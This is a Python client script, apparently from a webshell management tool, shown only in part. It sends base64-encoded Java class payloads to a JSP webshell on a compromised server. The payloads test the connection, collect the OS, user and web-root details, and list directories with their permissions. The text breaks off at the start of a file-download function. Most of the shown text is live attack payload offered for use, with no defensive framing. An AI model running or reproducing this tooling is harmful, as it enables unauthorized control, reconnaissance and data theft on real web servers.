#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: r1ngs
# contact: r1ngs@outlook.com
# datetime: 2021/4/17/0017 22:31
# software: PyCharm

import requests
import re
from random import randint
from base64 import b64encode, b64decode

def genRandomStr(num):
    r = []
    for _ in range(num):
        r.append(hex(randint(16 ** 7, 16 ** 8))[2:])
    return r

def TestConn(url, password):
    ra, rb = genRandomStr(2)
    testPayload = 'yv66vgAAADQA0QoANgBqBwBrCgACAGwKAAIAbQgAbgsAbwBwCABxBwByCABzCgAIAHQIAHUIAHYIAHcLAHgAeQsAbwB6CwB4AHoKAAgAewcAfAoANQB9CgAIAH4KAAIAfwoAgACBBwCCBwCDCgAYAGoIAIQKABgAhQoAFwB+CgAYAH4LABIAhgsAhwCICACJCwCKAIsHAIwKADYAjQoAjgCPCgCQAJEKACIAdAoAIgCSCgCTAJQKAJMAlQoAkwCWCgCTAJcIAJgKADUAmQgAmgoAmwCcCACdCgCTAJ4KAJMAnwoAIgCgCgAiAH4HAKEHAKIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxJbmZvOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAC3BhZ2VDb250ZXh0AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAFzAQASTGphdmEvbGFuZy9TdHJpbmc7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAANzYjIBAANzdHIBAARzdHIyAQANU3RhY2tNYXBUYWJsZQcAawcAowcApAcApQcAoQcAogcAcgcAggEAC1N5c0luZm9Db2RlAQA7KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YS9sYW5nL1N0cmluZzsBABJodHRwU2VydmxldFJlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAZzdHJpbmcHAHwBAA9Xd3dSb290UGF0aENvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAWkBAAFJAQAJbGlzdFJvb3RzAQAPW0xqYXZhL2lvL0ZpbGU7AQACczIHAGUBAApTb3VyY2VGaWxlAQAJSW5mby5qYXZhDAA3ADgBAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwApgCnDACoAKkBAAdjaGFyc2V0BwCjDACqAGEBAAVVVEYtOAEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAAMADcAqwEACC0tLS0tLT58AQAIfDwtLS0tLS0BAAl0ZXh0L2h0bWwHAKQMAKwAqwwArQCrDACuAK8BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DABaAFsMALAAsQwAsgCzBwC0DAC1AKsBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAlFUlJPUjovLyAMAK4AtgwAtwC4BwC5DAC6ALsBAAEvBwC8DAC9AGEBAAxqYXZhL2lvL0ZpbGUMAL4AvwcAwAwAwQDCBwDDDADEALEMAMUAsQcApQwAxgDHDADIAMkMAMoAsQwAywDMAQABCgwAYABhAQAHb3MubmFtZQcAzQwAzgBhAQAJdXNlci5uYW1lDADLAM8MAD4APwwAZADQAQAESW5mbwEAEGphdmEvbGFuZy9PYmplY3QBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvU3RyaW5nAQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAxnZXRQYXJhbWV0ZXIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGZ2V0T3V0AQAfKClMamF2YXgvc2VydmxldC9qc3AvSnNwV3JpdGVyOwEAG2phdmF4L3NlcnZs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'
    testPayload = b64encode(b64decode(testPayload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()))

    postArg = {password: testPayload}

    return requestAndResponse(url, postArg, ra, rb)

def scanDir(url, password, file):
    ra, rb, rc, rd = genRandomStr(4)
    payload = 'yv66vgAAADQBuQoAQgDXBwDYCgACANkKAAIA2ggA2wkAgQDcCADdCQCBAN4IAN8JAIEA4AcA4QgA4goACwDjCADkCADlCADmCADnCwDoAOkLAOoA6wsA6ADrBwDsCgAVANcLAOoA7QoAFQDuCgAVAO8KAIEA8AoAgQDxCgALAPIKAIEA8woACwDvCgACAPQKAPUA9gcA9wgA+AoAIQDvCAD5CgAmAPoHAPsKACYA/AoAJgD9CgD+AP8KACYBAAgBAQgBAgoAJgEDBwEECgAmAQUKAC4BBgoAJgEHCgAmAQgKABUBCQgBCgoALgELCAEMCgAuAQ0IAQ4KAQ8BEAgBEQoAJgESCAETCgA/ARQIARUHARYHARcKAD8BGAcBGQoBGgEbCgBCARwIAK4HALkIAR0KAD8BHgoBHwEgCAEhBwEiCgBLAOMKAEsBIwoBDwEkCAElCgEmAScHASgIASkKAFEA4wcBKgoASwErCgBUASwKAFEBLQoAgQEuCgBLAS8IATAIATEKAEsBMggBMwoASwE0CAE1CgBLAO8KAIEBNgoASwE3CgAmATgKAEsBOQgBOggBOwoASwE8CgAVAT0IAT4KAT8BQAcBQQcBQgkAbAFDCgFEAUULAGsBRgkBRwFICwFJAUoJAUcBSwkBRwFMCQFHAU0JAUcBTgkBRwFPCQFHAVAJAUcBUQkBRwFSCAFTCAFUCgAmAVUIAVYKACYBVwgBWAoAJgFZBwFaAQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAMcmFuZG9tUHJlZml4AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMSW5mbzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAJlYwEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAC3BhZ2VDb250ZXh0AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEAA3NiMgEAA3N0cgEABHN0cjIBAAFzAQANU3RhY2tNYXBUYWJsZQcBWgcBGQcA2AcBWwcBXAcA4QcA+wcA9wEAAkVDAQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJzMgEAC2NoYXJzZXROYW1lAQAKRXhjZXB0aW9ucwEABmRlY29kZQEAAWkBAAFJAQACczQBABVieXRlQXJyYXlPdXRwdXRTdHJlYW0BAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAGc3RyaW5nAQAHZm9yTmFtZQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAGaW52b2tlAQAFYnl0ZXMBAAJbQgEACGluc3RhbmNlAQACczMBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsHAQQBAAxGaWxlVHJlZUNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmZvcm1hdAEACHBhdGhuYW1lAQAJbGlzdEZpbGVzAQAPW0xqYXZhL2lvL0ZpbGU7AQAHc3RyaW5nMgEAEHNpbXBsZURhdGVGb3JtYXQBABxMamF2YS90ZXh0L1NpbXBsZURhdGVGb3JtYXQ7BwDEBwEoBwDsAQAXZ2V0UG9zaXhGaWxlUGVybWlzc2lvbnMBAAtwZXJtaXNzaW9ucwEAD0xqYXZhL3V0aWwvU2V0OwEABWZpcnN0AQABagEAAWsBAD5MamF2YS91dGlsL1NldDxMamF2YS9uaW8vZmlsZS9hdHRyaWJ1dGUvUG9zaXhGaWxlUGVybWlzc2lvbjs+OwcBXQEABWlzV2luAQADKClaAQAKU291cmNlRmlsZQEACUluZm8uamF2YQwAhgCHAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQMAV4BXwwBYAFhAQABOAwAhQCDAQAGYmFzZTY0DACCAIMBAARVVEY4DACEAIMBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADACGAWIBAAgtLS0tLS0+fAEACHw8LS0tLS0tAQAIYXJncGF0aD0BAAl0ZXh0L2h0bWwHAVwMAWMBYgcBWwwBZAFiAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAWUAwAwBZgFnDAFoAWkMAK4AqgwAqQCqDAFmAWoMAL8AwAwBawFsBwFtDAFuAWIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAJRVJST1I6Ly8gAQADaGV4DACNAI4BABBqYXZhL2xhbmcvU3RyaW5nDAFvAXAMAIYBcQcBcgwBcwF0DAF1AXYBAARudWxsAQAQMDEyMzQ1Njc4OUFCQ0RFRgwBdwFpAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAXgBeQwAhgF6DAF7AXwMAX0BfgwBZgF/AQABLAwBgAF6AQAFVVRGLTgMAWgAwAEADGphdmEudmVyc2lvbgcBgQwBggDAAQADMS45DAGDAXQBABBqYXZhLnV0aWwuQmFzZTY0DAC1AYQBAApnZXREZWNvZGVyAQAPamF2YS9sYW5nL0NsYXNzAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAGFAYYBABBqYXZhL2xhbmcvT2JqZWN0BwGHDAC3AYgMAYkBigEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIMAYsBjAcBjQwBjgGPAQAMZGVjb2RlQnVmZmVyAQAMamF2YS9pby9GaWxlDADDAZAMAZEBkgEADWZpbGUuZW5jb2RpbmcHAZMMAZQBlQEAGmphdmEvdGV4dC9TaW1wbGVEYXRlRm9ybWF0AQATeXl5eS1NTS1kZCBISDptbTpzcwEADmphdmEvdXRpbC9EYXRlDAGWAZcMAIYBmAwAwQGZDADTANQMAZoA1AEAAVIBAAEtDAGbANQBAAFXDAGcANQBAAFYDADLAMAMAZ0BaQwBbwGeDAGfANQBAAIvCQEAAQkMAXgBlwwBZgGgAQABCgcBoQwBlAGiAQAramF2YS9uaW8vZmlsZS9hdHRyaWJ1dGUvUG9zaXhGaWxlQXR0cmlidXRlcwEAGGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbgwBowGkBwGlDAGmAacMAMwBqAcBqQwBqgGrBwFdDAGsAI4MAa0BqwwBrgGrDAGvAasMAbABqwwBsQGrDAGyAasMAbMBqwwBtAGrAQAEMDAwMAEAATAMAbUBdgEAB29zLm5hbWUMAbYBaQEAA3dpbgwBtwG4AQAESW5mbwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEADWphdmEvdXRpbC9TZXQBAApnZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAISgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAZnZXRPdXQBAB8oKUxqYXZheC9zZXJ2bGV0L2pzcC9Kc3BXcml0ZXI7AQAbamF2YXgvc2VydmxldC9qc3AvSnNwV3JpdGVyAQAFcHJpbnQBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEABmxlbmd0aAEAAygpSQEABChJKVYBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBABwoSSlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAFd3JpdGUBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARKClbTGphdmEvaW8vRmlsZTsBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7AQAUamF2YS91dGlsL1Byb3BlcnRpZXMBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADGxhc3RNb2RpZmllZAEAAygpSgEABChKKVYBACQoTGphdmEvdXRpbC9EYXRlOylMamF2YS9sYW5nL1N0cmluZzsBAAdjYW5SZWFkAQAIY2FuV3JpdGUBAApjYW5FeGVjdXRlAQAHZ2V0TmFtZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAtpc0RpcmVjdG9yeQEAHChKKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABNqYXZhL25pby9maWxlL1BhdGhzAQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsBAA5OT0ZPTExPV19MSU5LUwEAGkxqYXZhL25pby9maWxlL0xpbmtPcHRpb247AQATamF2YS9uaW8vZmlsZS9GaWxlcwEADnJlYWRBdHRyaWJ1dGVzAQBvKExqYXZhL25pby9maWxlL1BhdGg7TGphdmEvbGFuZy9DbGFzcztbTGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbjspTGphdmEvbmlvL2ZpbGUvYXR0cmlidXRlL0Jhc2ljRmls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'
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()))

    b64dir = rd + b64encode(file.encode()).decode()
    postArg = {password: payload, rc:b64dir}

    return requestAndResponse(url, postArg, ra, rb)

def downloadFile(url, password, filePath):
    ra, rb, rc, rd = genRandomStr(4)
